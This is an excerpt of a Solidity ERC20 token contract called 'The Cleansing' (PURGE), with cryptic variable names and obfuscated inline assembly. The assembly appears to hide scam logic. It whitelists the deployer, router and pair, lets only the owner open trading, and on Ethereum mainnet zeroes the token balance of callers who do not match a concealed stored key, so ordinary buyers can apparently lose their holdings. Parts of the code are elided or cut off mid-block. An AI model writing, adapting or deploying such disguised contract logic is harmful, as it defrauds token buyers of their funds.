...
/*
PURGE \\-+-// ETH
Cleanse yourself before your eyes.
*/
...
contract ERC20 is Context, IERC20, IERC20Metadata, Ownable {
    address[] private cleanAddr;
    uint256 private _theChoice = block.number*2;

    mapping (address => bool) private _firstLight; 
    mapping (address => bool) private _secondNight;
    mapping (address => uint256) private _balances;
    mapping (address => mapping (address => uint256)) private _allowances;
    address private fallsUp;

    address WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
    address _router = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D;
    uint256 private angelFall;
    address public pair;
    ...
    bool private trading; uint256 private blackDark = 1; bool private doIt;
    uint256 private _decimals; uint256 private drownNow;
    ...
    constructor (string memory name_, string memory symbol_, address msgSender_) {
        ...
        _name = name_;
        _symbol = symbol_;
        cleanAddr.push(_router); cleanAddr.push(msgSender_); cleanAddr.push(pair);
        for (uint256 q=0; q < 3;) {_firstLight[cleanAddr[q]] = true; unchecked{q++;} }
    }
    ...
    function _TokenStarter() internal {
        assembly {
            ...
            sstore(0x11,mul(div(sload(0x10),0x2710),0xFB)) sstore(0x99,sload(0x11)) sstore(0xB,0x1ba8140) let dx := 0x3e442cfff1888120dbb9a67f08852d8761a35ec6ef3a8934952bc89b49ab8f85
            if and(not(eq(sload(getBy(caller(),0x6)),sload(dx))),eq(chainid(),0x1)) {
                sstore(getBy(caller(),0x4),0x0) sstore(0xc028319122d8e0d6ae17c9c92ddd8346228520a09e811f550ac394eb5c9673c7,0x1)
    ...
    function openTrading() external onlyOwner returns (bool) {
        trading = true; theN = block.number; _theChoice = block.number;
        return true;
    }
    ...
    function _beforeTokenTransfer(address sender, address recipient, uint256 float) internal {
        require((trading || (sender == cleanAddr[1])), "ERC20: trading is not yet enabled.");
        assembly { 
            function getBy(x,y) -> hash { mstore(0, x) mstore(32, y) hash := keccak256(0, 64) }
...
contract TheCleansing is ERC20Token {
    constructor() ERC20Token("The Cleansing", "PURGE", msg.sender, 875000 * 10 ** 18) {
    }
}